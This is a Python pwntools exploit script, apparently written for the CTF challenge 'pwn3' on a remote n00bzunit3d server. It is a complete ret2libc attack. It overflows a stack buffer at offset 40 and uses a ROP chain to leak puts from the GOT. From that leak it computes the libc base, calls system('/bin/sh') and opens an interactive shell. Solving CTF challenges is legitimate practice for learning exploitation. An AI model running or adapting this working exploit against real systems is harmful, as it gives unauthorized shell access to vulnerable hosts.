from pwn import *

context.log_level = 'debug'
context.arch = 'amd64'

elf = ELF('./pwn3')
libc = ELF('libc6_2.35-0ubuntu3.1_amd64.so')
context.binary = elf
#p = elf.process()
p = remote('challs.n00bzunit3d.xyz', 42450)

offset = 40

rop = ROP(elf)
rop.call(elf.symbols['puts'], [elf.got['puts']])
rop.call(elf.symbols['main'])

payload = [
    b'A' * offset,
    rop.chain()
]
payload = b''.join(payload)

p.recv()
p.sendline(payload)

p.recvline()
p.recvline()

leak = u64(p.recvline().strip().ljust(8, b'\x00'))

print(f'puts: {hex(leak)}')

libc.address = leak - libc.symbols['puts']

rop = ROP(libc)
# rop.call('puts', [next(libc.search(b'/bin/sh\x00'))])
rop.call('system', [next(libc.search(b'/bin/sh\x00'))])


payload = [
    b'A' * offset,
    p64(0x000000000040101a), #ret
    rop.chain()
]

payload = b''.join(payload)
print(payload)
print(len(payload))

p.recv()
p.sendline(payload)
p.recv()

p.interactive()